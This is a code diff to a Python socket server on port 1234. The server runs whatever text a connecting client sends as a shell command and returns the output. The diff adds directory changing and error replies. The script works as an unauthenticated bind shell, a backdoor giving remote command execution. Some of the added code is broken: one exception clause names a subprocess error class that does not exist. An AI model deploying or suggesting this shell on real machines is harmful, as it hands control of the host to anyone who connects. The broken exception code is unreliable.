@@ -3,6 +3,8 @@
 import socket
 import threading
 import subprocess
+import os
+import readline
 
 PORT = 1234
 connections = []
@@ -27,9 +29,17 @@ def handler(conn):
             conn.close()
             del connections[connections.index(conn)]
         else:
-            send = subprocess.check_output(income, shell=True)
-            print ('result = {}'.format(send))
-            conn.send(send)
+            try:
+                if income.startswith("cd ") is False:
+                    send = subprocess.check_output(income, shell=True)
+                    print ('result = {}'.format(send))
+                    conn.send(send)
+                elif income.startswith("cd ") is True:
+                    splitstr = income.split(" ")
+                    print (os.chdir(splitstr[1]))
+            except Exception as e:
+                l = "INCORRECT COMMAND ERROR {}".format(e)
+                conn.send(l.encode("utf8"))
 
 def listen(PORT):
     global connections
@@ -53,5 +63,7 @@ while run:
         var = input()
     except KeyboardInterrupt:
         _exit()
+    except subprocess.CallProcessError() as e:
+        print ("Sub Pro Error {}".format(e))
     except OSError:
         pass
